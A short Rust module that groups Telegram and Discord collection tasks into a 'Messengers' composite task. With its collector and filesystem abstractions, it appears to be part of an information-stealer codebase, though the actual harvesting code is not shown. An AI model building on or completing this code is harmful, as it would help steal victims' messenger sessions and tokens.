#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;
use crate::alloc::borrow::ToOwned;
mod discord;
mod telegram;

use crate::discord::DiscordTask;
use crate::telegram::TelegramTask;
use alloc::vec;
use collector::Collector;
use filesystem::FileSystem;
use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};

pub struct MessengersTask<C: Collector, F: FileSystem> {
    inner: CompositeTask<C, F>,
}

impl<C: Collector, F: FileSystem> Default for MessengersTask<C, F> {
    fn default() -> Self {
        Self {
            inner: composite_task!(TelegramTask, DiscordTask),
        }
    }
}

impl_composite_task_runner!(MessengersTask<C, F>, "Messengers");
